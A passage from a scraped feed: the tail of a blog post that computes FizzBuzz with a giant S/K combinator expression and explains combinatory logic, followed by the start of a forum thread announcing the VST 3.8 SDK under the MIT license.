(S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K)))))))(((((S)((K)(S)))(K))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(K))))((K)(((S)(K))(K)))))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(S))((K)(((S)(K))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(S))((K)(((S)(K))(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))))));&lt;/code&gt;
    &lt;p&gt;It’s time. You press enter.&lt;/p&gt;
    &lt;p&gt;Several seconds go by.&lt;/p&gt;
    &lt;p&gt;The tension is invigorating.&lt;/p&gt;
    &lt;p&gt;Suddenly, the terminal fills with output:&lt;/p&gt;
    &lt;code&gt;1
2
fizz
4
buzz
fizz
7
8
fizz
buzz
11
fizz
13
14
fizzbuzz
16
17
fizz
19
buzz
fizz
22
23
fizz
buzz
26
fizz
28
29
fizzbuzz
31
32
fizz
34
buzz
fizz
37
38
fizz
buzz
41
fizz
43
44
fizzbuzz
46
47
fizz
49
buzz
fizz
52
53
fizz
buzz
56
fizz
58
59
fizzbuzz
61
62
fizz
64
buzz
fizz
67
68
fizz
buzz
71
fizz
73
74
fizzbuzz
76
77
fizz
79
buzz
fizz
82
83
fizz
buzz
86
fizz
88
89
fizzbuzz
91
92
fizz
94
buzz
fizz
97
98
fizz
buzz&lt;/code&gt;
    &lt;p&gt;You lean back, exhausted but triumphant.&lt;/p&gt;
    &lt;p&gt;Dana is dead.&lt;/p&gt;
    &lt;head rend="h2"&gt;What the heck did I just read?&lt;/head&gt;
    &lt;p&gt;The culmination of months of effort!&lt;/p&gt;
    &lt;p&gt;Combinatory logic is a model of computation that is extremely minimal. All you start with are two functions: &lt;code&gt;S&lt;/code&gt; and &lt;code&gt;K&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;S&lt;/code&gt;is a function that, given three functions&lt;code&gt;x&lt;/code&gt;,&lt;code&gt;y&lt;/code&gt;, and&lt;code&gt;z&lt;/code&gt;, returns&lt;code&gt;x(z)(y(z))&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;K&lt;/code&gt;is a function that, given two functions&lt;code&gt;x&lt;/code&gt;and&lt;code&gt;y&lt;/code&gt;, returns&lt;code&gt;x&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You can compute anything you want just by passing these two functions into each other. For example, the identity function &lt;code&gt;I = (x) =&amp;gt; x&lt;/code&gt; can be expressed as &lt;code&gt;S(K)(K)&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;And you can build up arbitrarily complex functions from there. There is no limit.&lt;/p&gt;
    &lt;p&gt;Combinatory logic is basically lambda calculus without variables. Despite this limitation, combinatory logic is still Turing complete.&lt;/p&gt;
    &lt;p&gt;It is also extremely difficult to understand.&lt;/p&gt;
    &lt;head rend="h2"&gt;Further reading&lt;/head&gt;
    &lt;p&gt;If you found this post interesting (whether or not you understood it), the following resources would be good places start exploring:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;To Mock a Mockingbird, by Raymond Smullyan&lt;/item&gt;
      &lt;item&gt;Programming with Nothing, by Tom Stuart&lt;/item&gt;
      &lt;item&gt;Kyle Kingsbury’s Technical Interview series&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In particular, I strongly recommend reading To Mock a Mockbird if you want to understand combinatory logic. It’s the most fun, accessible way to learn combinatory logic from scratch. It took me about a month’s spare time to work through it. Time well spent!&lt;/p&gt;
    &lt;head rend="h3"&gt;Skoobert&lt;/head&gt;
    &lt;p&gt;After reading To Mock a Mockingbird, I wanted to program in combinatory logic but found existing tools lacking. So I spent a weekend building Skoobert, which is intended to be the ideal programming language for experimenting with lambda calculus and combinatory logic. Give it a try and let me know what you think!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://joshmoody.org/blog/programming-with-less-than-nothing/"/><published>2025-10-23T05:42:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45678549</id><title>VST3 audio plugin format is now MIT</title><updated>2025-10-23T17:37:18.475852+00:00</updated><content>&lt;doc fingerprint="3d5716530856fbdc"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;div&gt;Yvan
1&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;VST 3.8 SDK Released&lt;/p&gt;
        &lt;p&gt;Dear VST Developers,&lt;/p&gt;
        &lt;p&gt;Steinberg Media Technologies today releases the VST SDK 3.8&lt;/p&gt;
        &lt;p&gt;Here’s a brief overview of changes:&lt;/p&gt;
        &lt;head rend="h1"&gt;Version 3.8.0 (2025/10/20)&lt;/head&gt;
        &lt;p&gt;The SDK can be downloaded here:&lt;/p&gt;
        &lt;p&gt;Online documentation available under:&lt;lb/&gt; VST - VST 3 Developer Portal (steinbergmedia.github.io)&lt;/p&gt;
        &lt;p&gt;Main VST page: vstdev.org&lt;/p&gt;
        &lt;p&gt;Your Steinberg Team&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 14 Likes &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;Congratulations! Great to see both MIDI 2.0 and the new MIT license together!&lt;/p&gt;
        &lt;p&gt;Pete&lt;lb/&gt; Microsoft&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 1 Like &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;Great news!&lt;/p&gt;
        &lt;p&gt;FYI the SSL cert for https://vstdev.org/ doesn’t seem to be correct.&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;rhansen
5&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;I assume it is correct. The domain vstdev.org just forwards to VSTDev (on github.io) where the website resides. Is your browser complaining about that?&lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
